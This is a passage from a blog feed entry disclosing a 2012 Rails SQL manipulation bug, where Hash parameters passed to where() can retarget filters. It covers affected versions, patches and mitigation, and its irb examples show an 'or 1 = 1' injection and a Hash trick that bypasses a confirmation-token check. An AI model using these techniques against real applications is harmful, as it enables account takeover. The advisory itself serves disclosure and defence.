</span><span class='line'>
</span><span class='line'><span class="no">UserDetail</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">5</span><span class="n">ms</span><span class="p">)</span>   <span class="no">SELECT</span> <span class="o">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span>
</span><span class='line'><span class="p">(</span><span class="sb">`user_details`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 or 1 = 1); -- `</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This <code>Hash</code> problem is actually a security bug in rails and the rails team has released a patch for it.</p>

<h2>Underlying Problem</h2>

<p>The problem is developers expect the user input to be a <code>String</code> but it can also be an <code>Array</code> or a <code>Hash</code> and Rails has quite different behaviour if a <code>Hash</code> or an <code>Array</code> is passed in. The <code>Hash</code> is particularly troubling because if you have a filter on column X then a user can change it to be a filter on column Y. Example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">001</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:confirmation_token</span> <span class="o">=&gt;</span> <span class="s2">&quot;foo&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 </span>
</span><span class='line'><span class="sb">    AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">confirmation_token</span><span class="sb">` = &#39;foo&#39;</span>
</span><span class='line'><span class="sb">=&gt; []</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">002</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:confirmation_token</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s2">&quot;users.id&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;1&quot;</span><span class="p">})</span>
</span><span class='line'>  <span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 </span>
</span><span class='line'><span class="sb">    AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="nb">id</span><span class="sb">` = 1</span>
</span><span class='line'><span class="sb">=&gt; [#&lt;User id: 1, email: &quot;benmmurphy@gmail.com&quot;, encrypted_password: &quot;f1fcf94f12b17a447e1c4a98ba2bae934aacabb7&quot;, salt: &quot;abcb87e3031102d110cf87734d39d8a1e6d8c03e&quot;, confirmation_token: nil, remember_token: &quot;975dc5fb3524a90f1a6aff4c1a111d2cd8bfcc50&quot;, created_at: &quot;2012-05-15 08:28:01&quot;, updated_at: &quot;2012-05-15 08:28:01&quot;&gt;]</span>
</span></code></pre></td></tr></table></div></figure>


<p>This <code>Hash</code> trick only seems to work on <code>where</code> filterings and not <code>find_by</code> methods:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">006</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_confirmation_token</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;users.id&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;1&quot;</span><span class="p">})</span>
</span><span class='line'><span class="no">ArgumentError</span><span class="p">:</span> <span class="no">Unknown</span> <span class="n">key</span><span class="p">:</span> <span class="n">users</span><span class="o">.</span><span class="n">id</span>
</span><span class='line'>  <span class="n">from</span><span class="sr"> /Users/</span><span class="n">benmurphy</span><span class="o">/.</span><span class="n">rbenv</span><span class="o">/</span><span class="n">versions</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">9</span><span class="o">.</span><span class="mi">2</span><span class="o">-</span><span class="n">p290</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">9</span><span class="o">.</span><span class="mi">1</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="n">activesupport</span><span class="o">-</span><span class="mi">3</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="mi">2</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">active_support</span><span class="o">/</span><span class="n">core_ext</span><span class="o">/</span><span class="nb">hash</span><span class="o">/</span><span class="n">keys</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">44</span><span class="ss">:in</span> <span class="sb">`block in assert_valid_keys&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Vulnerable Code</h2>

<ul>
<li>https://github.com/thoughtbot/clearance - Possible to change any users password.</li>
<li>Rails ( 2.3.x, &lt; 3.2.6, &lt;3.1.6, &lt; 3.0.14) SQL manipulation/SQL injection anywhere there is use of <code>where()</code> or <code>find()</code> that takes user input.</li>
</ul>


<h2>Fixes</h2>

<ul>
<li>Rails has <a href="http://weblog.rubyonrails.org/2012/6/12/ann-rails-3-2-6-has-been-released/">released 3.2.6</a> that fixes both the nil issue and SQL manipulation/injection problems with <code>Hash</code>.</li>
<li>Clearance has released a new version <a href="http://robots.thoughtbot.com/post/24197949040/clearance-0-16-3-fixes-a-password-reset-vulnerability">0.6.13</a> which fixes the problem with nil parameters</li>
</ul>


<h2>Mitigation</h2>

<p>It is recommended that you install the Rails patches to fix the <code>Hash</code> problem and nil problem. Also, with security sensitive code I strongly recommend all query
parameters be coerced to the type you expect them to be. For example if you expect a parameter to be a <code>String</code> you should call <code>to_s</code> on it.</p>

<h2>Previous Work</h2>

<p>The Devise team seem to have been aware of the general problem of users being able to send non-string parameters. They have a <code>ParamFilter</code>
class that forces all parameters to be <code>String</code>s. It looks like they did this because they had an injection problem with mongoid.</p>

<figure class='code'><figcaption><span>ParamFilter </span><a href='https://github.com/plataformatec/devise/blob/master/lib/devise/param_filter.rb#L26'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Force keys to be string to avoid injection on mongoid related database.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">stringify_params</span><span class="p">(</span><span class="n">conditions</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">conditions</span> <span class="k">unless</span> <span class="n">conditions</span><span class="o">.</span><span class="n">is_a?</span><span class="p">(</span><span class="no">Hash</span><span class="p">)</span>
</span><span class='line'>  <span class="n">conditions</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="o">|</span>
</span><span class='line'>    <span class="n">conditions</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">to_s</span> <span class="k">if</span> <span class="n">param_requires_string_conversion?</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Stay Tuned</h2>

<p>We only covered the issues fixed in 3.2.5 and 3.2.4 in this article. There was another variant of the <code>Hash</code> attack that was fixed in 3.2.6. I will cover
that in a future article and show how to exploit it.</p>
]]></content>
  </entry>
  
</feed>
